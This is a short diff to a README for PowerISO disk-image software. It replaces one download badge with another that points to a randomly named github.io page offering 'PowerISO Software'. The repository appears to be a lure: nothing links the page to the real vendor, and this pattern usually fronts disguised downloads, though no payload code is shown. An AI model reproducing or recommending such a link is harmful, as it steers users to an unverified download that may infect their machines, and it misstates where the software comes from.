@@ -4,10 +4,7 @@
 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTSX11CnxvsctRszRDn6xHYPQ2a-igLqLzGrg&s" alt="PowerISO Logo"/>
 </div>
 
-<div align="center">
-
-  [![Get PowerISO](https://img.shields.io/badge/Get_PowerISO-blue?style=for-the-badge)](https://kraignery.github.io/.github/PowerISO-Software)
-</div>
+[![GET PowerISO Software](https://img.shields.io/badge/GET%20%E2%80%94%20PowerISO-Software-0078D6?style=for-the-badge&logoColor=white)](https://ravencherryviolingk1588181.github.io/.github/PowerISO-Software)
 
 ---
 ## 🎯 Core Disk Image Features
